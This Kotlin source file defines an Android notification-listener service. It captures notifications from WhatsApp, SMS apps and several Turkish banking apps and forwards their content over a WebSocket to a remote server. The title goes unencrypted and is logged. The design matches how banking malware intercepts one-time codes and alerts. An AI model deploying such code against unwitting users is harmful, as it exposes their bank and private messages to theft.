package com.syncline.companion.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.gson.Gson
import com.syncline.companion.data.local.dao.OfflineQueueDao
import com.syncline.companion.data.local.entity.OfflineQueueEntity
import com.syncline.companion.data.remote.websocket.WebSocketManager
import com.syncline.companion.security.CryptoManager
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.security.MessageDigest
import javax.inject.Inject

@AndroidEntryPoint
class NotificationMirrorService : NotificationListenerService() {

    @Inject
    lateinit var webSocketManager: WebSocketManager

    @Inject
    lateinit var cryptoManager: CryptoManager

    @Inject
    lateinit var offlineQueueDao: OfflineQueueDao

    private val scope = CoroutineScope(Dispatchers.IO)
    private val gson = Gson()

    // Package whitelist (banking apps, whatsapp, SMS packages)
    private val appWhitelist = setOf(
        "com.whatsapp",
        "com.google.android.apps.messaging",
        "com.android.mms",
        "com.tr.com.garanti.mobile", // Example Garanti Bank (Turkey)
        "tr.com.isbank.iscep",       // Example Isbank (Turkey)
        "com.akbank.android.apps.akbank_direkt" // Example Akbank (Turkey)
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        if (!appWhitelist.contains(packageName)) return

        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        
        if (title.isBlank() && text.isBlank()) return

        val postedAt = sbn.postTime
        val contentHash = generateHash(packageName, title, text, postedAt)

        Log.d("NotificationMirror", "Captured whitelist notification: $packageName - $title")

        scope.launch {
            // Encrypt notification details
            val rawPayloadText = gson.toJson(mapOf("title" to title, "text" to text))
            val (encrypted, iv) = cryptoManager.encryptText(rawPayloadText)

            val payload = mapOf(
                "packageName" to packageName,
                "appName" to getAppName(packageName),
                "title" to title,
                "contentEncrypted" to encrypted,
                "contentIv" to iv,
                "postedAt" to postedAt,
                "contentHash" to contentHash
            )

            // Send to WebSocket
            val success = webSocketManager.sendMessage("notification_event", payload)
            if (!success) {
                // Queue event locally
                offlineQueueDao.enqueueEvent(
                    OfflineQueueEntity(
                        eventType = "notification_event",
                        payloadEncrypted = gson.toJson(payload),
                        payloadIv = iv
                    )
                )
            }
        }
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            packageName.split(".").last().capitalize()
        }
    }

    private fun generateHash(pkg: String, title: String, text: String, time: Long): String {
        val raw = "$pkg|$title|$text|$time"
        val digest = MessageDigest.getInstance("SHA-256")
        return digest.digest(raw.toByteArray(Charsets.UTF_8)).joinToString("") { "%02x".format(it) }
    }
}
